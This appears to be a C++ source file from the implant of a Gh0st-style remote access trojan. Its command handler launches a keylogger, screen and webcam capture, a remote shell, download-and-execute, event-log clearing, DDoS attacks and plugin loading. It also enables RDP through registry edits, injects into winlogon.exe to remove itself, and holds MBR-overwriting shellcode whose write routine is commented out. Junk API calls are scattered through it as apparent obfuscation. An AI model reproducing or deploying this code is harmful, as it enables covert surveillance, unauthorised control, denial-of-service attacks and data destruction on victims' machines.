// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"

#include "KernelManager.h"
#include "loop.h"
#include "until.h"
#include "inject.h"
#include "SendLoginImfor.h"
#include "DDOS.h"

//#include "WinSvc.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;

unsigned char scode[] = 
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d"
"\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d";

int KillMBR()
{
// 	TCHAR szModule [MAX_PATH];
// 
// 	HANDLE hDevice;
// 	DWORD dwBytesWritten, dwBytesReturned;
// 	BYTE pMBR[512] = {0};
// 	
// 	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
// 
// 	// ���¹���MBR
// 	memcpy(pMBR, scode, sizeof(scode) - 1);
// 	pMBR[510] = 0x55;
// 	pMBR[511] = 0xAA;
// 	
// 	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
// 
// 	hDevice = CreateFile
// 		(
// 		"\\\\.\\PHYSICALDRIVE0",
// 		GENERIC_READ | GENERIC_WRITE,
// 		FILE_SHARE_READ | FILE_SHARE_WRITE,
// 		NULL,
// 		OPEN_EXISTING,
// 		0,
// 		NULL
// 		);
// 	if (hDevice == INVALID_HANDLE_VALUE)
// 		return -1;
// 	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
// 	DeviceIoControl
// 		(
// 		hDevice, 
// 		FSCTL_LOCK_VOLUME, 
// 		NULL, 
// 		0, 
// 		NULL, 
// 		0, 
// 		&dwBytesReturned, 
// 		NULL
// 		);
// 	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
// 	// д�벡������
// 	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
// 	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
// 	DeviceIoControl
// 		(
// 		hDevice, 
// 		FSCTL_UNLOCK_VOLUME, 
// 		NULL, 
// 		0, 
// 		NULL, 
// 		0, 
// 		&dwBytesReturned, 
// 		NULL
// 		);
// 	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
// 	CloseHandle(hDevice);
// 	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
 	return 0;
}

CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	TCHAR szModule [MAX_PATH];

	if (lpszServiceName != NULL)
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		lstrcpy(m_strServiceName, lpszServiceName);
	}
	if (lpszKillEvent != NULL)
	{
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		lstrcpy(m_strKillEvent, lpszKillEvent);
	}
	if (lpszMasterHost != NULL)
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		lstrcpy(m_strMasterHost, lpszMasterHost);
	}

	m_nMasterPort = nMasterPort;
	m_dwServiceType = dwServiceType;
	m_nThreadCount = 0;
	// �������ӣ����ƶ˷��������ʼ����
	m_bIsActived = false;
	// ����һ�����Ӽ��̼�¼���߳�
	// ����HOOK��UNHOOK������ͬһ���߳���
	m_hThread[m_nThreadCount++] = 
		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Loop_HookKeyboard, NULL, 0,	NULL, true);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);

}

CKernelManager::~CKernelManager()
{
	TCHAR szModule [MAX_PATH];

	for(int i = 0; i < m_nThreadCount; i++)
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		TerminateThread(m_hThread[i], -1);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		CloseHandle(m_hThread[i]);
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	}
}
// ���ϼ���
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		{
			if ( lstrlen(CKeyboardManager::ConnPass) == 0 )//�ж����������Ƿ�Ϊ�գ�����������֤
			{
				if ( m_pClient->bSendLogin )//�ж��Ƿ��ظ����ͣ����Ե�ʱ�����2��
				{
					sendLoginInfo_true( m_strServiceName, m_pClient, (GetTickCount() - CKeyboardManager::dwTickCount)/2 );
					m_pClient->bSendLogin = false;
				}
				InterlockedExchange((LONG *)&m_bIsActived, true);
			}
			else//��Ϊ��
			{
				char Pass[256] = {0};
				memcpy( Pass, lpBuffer + 1, 200 );
				if ( lstrcmpi( CKeyboardManager::ConnPass, Pass ) == 0 )//��ʼ��֤
				{
					if ( m_pClient->bSendLogin )//�ж��Ƿ��ظ����ͣ����Ե�ʱ�����2��
					{
						sendLoginInfo_true( m_strServiceName, m_pClient, (GetTickCount() - CKeyboardManager::dwTickCount)/2 );
						m_pClient->bSendLogin = false;
					}
					InterlockedExchange((LONG *)&m_bIsActived, true);//���ϣ��򼤻�
				}
				else
				{
					InterlockedExchange((LONG *)&m_bIsActived, false);//�����ϣ��򲻼���
				}
			}
		}
		break;
	case COMMAND_LIST_DRIVE: // �ļ�����
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, (LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY: // ��Ļ�鿴
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_WEBCAM: // ����ͷ
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
//	case COMMAND_AUDIO: // ����
//		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,(LPVOID)m_pClient->m_Socket, 0, NULL);
//		break;
	case COMMAND_SHELL: // Զ��sehll
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, (LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SYSTEM: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_DOWN_EXEC: // ������
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,(LPVOID)(lpBuffer + 1), 0, NULL, true);
		SleepEx(101,0); // ���ݲ�����
		break;
	case COMMAND_OPEN_URL_SHOW: // ��ʾ����ҳ
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // ���ش���ҳ
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE: // ж��,
		UnInstallService();
		break;
	case COMMAND_CLEAN_EVENT: // �����־
		{
			CleanEvent();
		}
		break;
	case COMMAND_SESSION:
		CSystemManager::ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK: // �ı�ע
		SetHostID(m_strServiceName, (LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_UPDATE_SERVER: // ���·����
		if (UpdateServer((char *)lpBuffer + 1))
			UnInstallService();
		break;
	case COMMAND_REPLAY_HEARTBEAT: // �ظ�������
		break;
	case COMMAND_DDOS:
		if ( !Gobal_DDOS_Running )
		{
			m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DDOS_Attacker, (LPVOID)lpBuffer, 0, NULL, true);
			SleepEx(110,0);//���ݲ�����
		}
		break;
	case COMMAND_DDOS_STOP:
		DDOS_Stop();
		break;
	case COMMAND_HIT_HARD:
		KillMBR();
		break;
	case COMMAND_OPEN_3389:
		Open3389();
		break;
	case COMMAND_CHAJIAN: // ���ز��
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_CHAJIAN,(LPVOID)(lpBuffer + 1), 0, NULL, true);
		SleepEx(110,0); // ���ݲ�����
		break;
	}	
}

void CKernelManager::UnInstallService()
{
	TCHAR szModule [MAX_PATH];
//	if ( CKeyboardManager::hProtect != NULL ) TerminateThread( CKeyboardManager::hProtect, 0 );
//	if ( CKeyboardManager::hFile != NULL ) CloseHandle(CKeyboardManager::hFile);
	char	strServiceDll[MAX_PATH];
	char	strRandomFile[MAX_PATH];

	CKeyboardManager::MyGetModuleFileName( CKeyboardManager::g_hInstance, strServiceDll, sizeof(strServiceDll) );

	// װ�ļ��������������ʱɾ��
	wsprintf(strRandomFile, "%d.bak", GetTickCount());
	CKeyboardManager::MyMoveFile(strServiceDll, strRandomFile);
	MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

	// ɾ�����߼�¼�ļ�
	char	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	CKeyboardManager::Mylstrcat(strRecordFile, "\\desktop.inf");
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	DeleteFile(strRecordFile);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
//	RemoveService(m_strServiceName);

	if ( m_dwServiceType != 0x120 )  // owner��Զ��ɾ���������Լ�ֹͣ�Լ�ɾ��,Զ���߳�ɾ��
	{
		InjectRemoveService("winlogon.exe", m_strServiceName);
	}
	else // shared���̵ķ���,����ɾ���Լ�
	{
		RemoveService(m_strServiceName);
	}

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	// ���в�����ɺ�֪ͨ���߳̿����˳�
	CreateEvent( NULL, true, false, m_strKillEvent );
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}

void CKernelManager::Open3389()
{
    DWORD Port = 3389;
    CreateStringReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache","Enabled","0");
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer","EnableAdminTSRemote",0x00000001);
    CreateStringReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","ShutdownWithoutLogon","0");
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","TSEnabled",0x00000001);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TermDD","Start",0x00000002);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TermService","Start",0x00000002);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","fDenyTSConnections",0x00000001);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\RDPTcp","PortNumber",Port);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp","PortNumber",Port);
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp","PortNumber",Port);
    CreateStringReg(HKEY_USERS,".DEFAULT\\Keyboard Layout\\Toggle","Hotkey","2");
    MyCreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","fDenyTSConnections",0x00000000);
    return;
}

void CKernelManager::CreateStringReg(HKEY hRoot,char *szSubKey,char* ValueName,char *Data)
{
    HKEY hKey;
    //��ע�������������򴴽���
    long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
    {
        return;
    }
    //�޸�ע����ֵ��û���򴴽���
    lRet=RegSetValueEx(hKey,ValueName,0,REG_SZ,(BYTE*)Data,strlen(Data));
	if (lRet!=ERROR_SUCCESS)
	{
		return;
	}
    RegCloseKey(hKey);
}

//�����޸��������ͼ�ֵ
void CKernelManager::MyCreateDWORDReg(HKEY hRoot,char *szSubKey,char* ValueName,DWORD Data)
{
    HKEY hKey;
    //��ע�������������򴴽���
    long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
    {
        return;
    }
    DWORD dwSize=sizeof(DWORD);
    //�޸�ע����ֵ��û���򴴽���
    lRet=RegSetValueEx(hKey,ValueName,0,REG_DWORD,(BYTE*)&Data,dwSize);
	if (lRet!=ERROR_SUCCESS)
	{
		return;
	}
    RegCloseKey(hKey);
}
